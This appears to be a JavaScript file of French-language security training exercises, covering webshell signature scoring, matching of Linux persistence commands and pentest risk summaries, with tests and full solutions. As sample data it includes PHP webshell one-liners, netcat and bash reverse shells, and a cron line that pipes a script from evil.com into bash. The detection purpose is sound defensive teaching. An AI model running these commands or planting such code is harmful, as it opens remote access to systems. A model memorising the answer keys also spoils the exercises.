'use strict';

module.exports = [
  {
    "id": "hk3-c6-e1",
    "chapter": 6,
    "title": "Recherche illustrative de signatures textuelles",
    "level": "n1",
    "language": "analyse",
    "goal": "Relever des familles de chaînes sans certifier la nature ou le risque d’un script.",
    "brief": "<p>Ce modèle recherche uniquement des chaînes littérales et additionne une fois chaque famille présente : commandes (<code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>popen</code>) +40 ; évaluation (<code>eval</code>, <code>assert</code>) +30 ; transformations (<code>base64_decode</code>, <code>gzinflate</code>, <code>str_rot13</code>) +20 ; entrées (<code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>) +20. Le score et les seuils sont fictifs : une correspondance n’établit pas une malveillance et l’absence d’indice ne prouve pas l’innocuité. Une analyse complémentaire est nécessaire.</p><p>Pour <code>SCAN_SCRIPT code=&lt;texte&gt;</code>, afficher <code>WEBSHELL_SCAN: score=&lt;n&gt; status=&lt;INDICES_FORTS|INDICES|AUCUN_INDICE&gt; risk=NON_EVALUE</code> : INDICES_FORTS à partir de 60, INDICES de 20 à 59, AUCUN_INDICE en dessous de 20.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e1) — Recherche illustrative de signatures textuelles\n# Complétez la réponse attendue sous chaque cas ci-dessous :\n\n[Cas 1 — Trois familles textuelles]\n# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST[\"payload\"])); ?>\nA_COMPLETER\n\n[Cas 2 — Une seule famille textuelle]\n# Données : SCAN_SCRIPT code=<?php $logo = base64_decode(\"iVBORw0KGgoAAAANSUhEUg==\"); ?>\nA_COMPLETER\n\n[Cas 3 — Aucune des chaînes recherchées]\n# Données : SCAN_SCRIPT code=<?php echo \"<h1>Bienvenue sur le portail</h1>\"; ?>\nA_COMPLETER\n",
    "hints": [
      "Compter chaque famille au maximum une fois.",
      "Le résultat ne classe pas le script comme bénin ou malveillant."
    ],
    "examples": [
      {
        "stdin": "SCAN_SCRIPT code=<?php if(isset($_REQUEST[\"cmd\"])){ system($_REQUEST[\"cmd\"]); } ?>",
        "expected": "WEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE",
        "note": "Deux familles sont présentes dans le texte ; le score ne remplace pas l’analyse."
      }
    ],
    "tests": [
      {
        "label": "Trois familles textuelles",
        "stdin": "cas:1",
        "expected": "WEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE"
      },
      {
        "label": "Une seule famille textuelle",
        "stdin": "cas:2",
        "expected": "WEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE"
      },
      {
        "label": "Aucune des chaînes recherchées",
        "stdin": "cas:3",
        "expected": "WEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE"
      }
    ],
    "solution": "[Exemple]\nWEBSHELL_SCAN: score=60 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 1 — Trois familles textuelles]\nWEBSHELL_SCAN: score=70 status=INDICES_FORTS risk=NON_EVALUE\n\n[Cas 2 — Une seule famille textuelle]\nWEBSHELL_SCAN: score=20 status=INDICES risk=NON_EVALUE\n\n[Cas 3 — Aucune des chaînes recherchées]\nWEBSHELL_SCAN: score=0 status=AUCUN_INDICE risk=NON_EVALUE\n"
  },
  {
    "id": "hk3-c6-e2",
    "chapter": 6,
    "title": "Recherche de motifs de persistance Linux",
    "level": "n2",
    "language": "analyse",
    "goal": "Repérer des motifs textuels associés à des techniques de persistance, sans conclure sur leur intention ou leur risque.",
    "brief": "<p>Une tâche planifiée ou un script de démarrage peut être utilisé pour maintenir un accès. Cette grille recherche uniquement quatre motifs textuels dans une commande ; elle ne lance aucune commande.<br><br>\nMotifs recherchés, par ordre de priorité :<br>\n1. <code>BASH_REVERSE_SHELL</code> : contient <code>/dev/tcp/</code> ou <code>bash -i</code>.<br>\n2. <code>NETCAT_REVERSE_SHELL</code> : contient <code>nc -e</code>, <code>ncat -e</code> ou <code>nc.traditional</code>.<br>\n3. <code>DOWNLOAD_EXECUTE</code> : contient <code>curl</code> ou <code>wget</code> suivi de <code>| sh</code> ou <code>| bash</code>.<br>\n4. <code>PYTHON_SOCKET_SHELL</code> : contient <code>python -c</code> et <code>socket</code>.<br><br>\nIndiquez le premier motif trouvé, ou <code>signature=AUCUNE_CORRESPONDANCE</code> si aucun ne correspond. Une correspondance ne prouve ni l'intention malveillante ni le niveau de risque ; son absence ne prouve pas non plus l'innocuité. Dans les deux cas, renseignez <code>malicious=NON_EVALUE</code> et <code>risk=NON_EVALUE</code> : une analyse complémentaire est nécessaire.<br><br>\nDonnées du cas : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>\nRésultat d’analyse attendu : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=NON_EVALUE signature=&lt;sig&gt; risk=NON_EVALUE</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e2) — Recherche de motifs de persistance Linux\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\n# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001\nA_COMPLETER\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\n# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash\nA_COMPLETER\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\n# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup\nA_COMPLETER\n",
    "hints": [
      "Repérez le type après type= et la commande après command=.",
      "Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.",
      "Formatez la sortie PERSIST_RESULT."
    ],
    "examples": [
      {
        "stdin": "PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE",
        "note": "La commande contient les motifs textuels de la famille BASH_REVERSE_SHELL."
      }
    ],
    "tests": [
      {
        "label": "Reverse shell netcat avec redirection de binaire shell",
        "stdin": "cas:1",
        "expected": "PERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE"
      },
      {
        "label": "Persistance par téléchargement et exécution de script distant",
        "stdin": "cas:2",
        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE"
      },
      {
        "label": "Tâche cron de sauvegarde et synchronisation",
        "stdin": "cas:3",
        "expected": "PERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE"
      }
    ],
    "solution": "[Exemple]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=BASH_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 1 — Reverse shell netcat avec redirection de binaire shell]\nPERSIST_RESULT: type=SERVICE malicious=NON_EVALUE signature=NETCAT_REVERSE_SHELL risk=NON_EVALUE\n\n[Cas 2 — Persistance par téléchargement et exécution de script distant]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=DOWNLOAD_EXECUTE risk=NON_EVALUE\n\n[Cas 3 — Tâche cron de sauvegarde et synchronisation]\nPERSIST_RESULT: type=CRON malicious=NON_EVALUE signature=AUCUNE_CORRESPONDANCE risk=NON_EVALUE"
  },
  {
    "id": "hk3-c6-e3",
    "chapter": 6,
    "title": "Générateur de Synthèse Managériale et Matrice de Risque de Pentest",
    "level": "n3",
    "language": "analyse",
    "goal": "Agréger les vulnérabilités découvertes, calculer le score de risque global et qualifier la posture de sécurité.",
    "brief": "<p>Le rapport d'intrusion conclut chaque mandat de pentest par une synthèse managériale (Executive Summary) et une matrice de sévérité.<br><br>\nPondération du score de risque :<br>\n- <code>CRITICAL</code> : 10 points chacun.<br>\n- <code>HIGH</code> : 5 points chacun.<br>\n- <code>MEDIUM</code> : 2 points chacun.<br>\n- <code>LOW</code> : 1 point chacun.<br>\n<code>risk_score = (C * 10) + (H * 5) + (M * 2) + (L * 1)</code>.<br><br>\nQualification de la posture globale de l'organisation :<br>\n1. Si <code>C &gt;= 1</code> ou <code>risk_score &gt;= 25</code> : <code>posture=COMPROMISED_CRITICAL</code>.<br>\n2. Sinon si <code>H &gt;= 2</code> ou <code>risk_score &gt;= 15</code> : <code>posture=HIGH_EXPOSURE</code>.<br>\n3. Sinon si <code>risk_score &gt;= 5</code> : <code>posture=MODERATE_EXPOSURE</code>.<br>\n4. Sinon : <code>posture=SECURE_RESILIENT</code>.<br><br>\nDonnées du cas : <code>PENTEST_SYNTHESIS findings=&lt;f1:sev1,f2:sev2,...&gt;</code>.<br>\nRésultat d’analyse attendu :<br>\n<code>PENTEST_SUMMARY: total_findings=&lt;N&gt; critical=&lt;C&gt; high=&lt;H&gt; medium=&lt;M&gt; low=&lt;L&gt; risk_score=&lt;score&gt; posture=&lt;posture&gt;</code>.</p>",
    "starter": "# Grille d'analyse (hk3-c6-e3) — Générateur de Synthèse Managériale et Matrice de Risque de Pentest\n# Complétez la résolution demandée sous chaque cas ci-dessous :\n\n[Cas 1 — Infrastructure avec failles élevées multiples sans faille critique]\n# Données : PENTEST_SYNTHESIS findings=xss_stored:HIGH,idor_api:HIGH,weak_password_policy:MEDIUM\nA_COMPLETER\n\n[Cas 2 — Environnement sain avec deux failles mineures d'en-tête]\n# Données : PENTEST_SYNTHESIS findings=missing_csp:LOW,server_banner:LOW\nA_COMPLETER\n\n[Cas 3 — Cumul de failles moyennes atteignant le seuil d'exposition modérée]\n# Données : PENTEST_SYNTHESIS findings=cors_wildcard:MEDIUM,rate_limit_bypass:MEDIUM,directory_listing:MEDIUM\nA_COMPLETER\n",
    "hints": [
      "Comptez les occurrences de CRITICAL, HIGH, MEDIUM, LOW dans findings.",
      "Calculez le score pondéré (10, 5, 2, 1).",
      "Appliquez les conditions de qualification de posture."
    ],
    "examples": [
      {
        "stdin": "PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW",
        "expected": "PENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL",
        "note": "Une vulnérabilité critique déclenche immédiatement la posture COMPROMISED_CRITICAL."
      }
    ],
    "tests": [
      {
        "label": "Infrastructure avec failles élevées multiples sans faille critique",
        "stdin": "cas:1",
        "expected": "PENTEST_SUMMARY: total_findings=3 critical=0 high=2 medium=1 low=0 risk_score=12 posture=HIGH_EXPOSURE"
      },
      {
        "label": "Environnement sain avec deux failles mineures d'en-tête",
        "stdin": "cas:2",
        "expected": "PENTEST_SUMMARY: total_findings=2 critical=0 high=0 medium=0 low=2 risk_score=2 posture=SECURE_RESILIENT"
      },
      {
        "label": "Cumul de failles moyennes atteignant le seuil d'exposition modérée",
        "stdin": "cas:3",
        "expected": "PENTEST_SUMMARY: total_findings=3 critical=0 high=0 medium=3 low=0 risk_score=6 posture=MODERATE_EXPOSURE"
      }
    ],
    "solution": "[Exemple]\nPENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL\n\n[Cas 1 — Infrastructure avec failles élevées multiples sans faille critique]\nPENTEST_SUMMARY: total_findings=3 critical=0 high=2 medium=1 low=0 risk_score=12 posture=HIGH_EXPOSURE\n\n[Cas 2 — Environnement sain avec deux failles mineures d'en-tête]\nPENTEST_SUMMARY: total_findings=2 critical=0 high=0 medium=0 low=2 risk_score=2 posture=SECURE_RESILIENT\n\n[Cas 3 — Cumul de failles moyennes atteignant le seuil d'exposition modérée]\nPENTEST_SUMMARY: total_findings=3 critical=0 high=0 medium=3 low=0 risk_score=6 posture=MODERATE_EXPOSURE"
  }
];
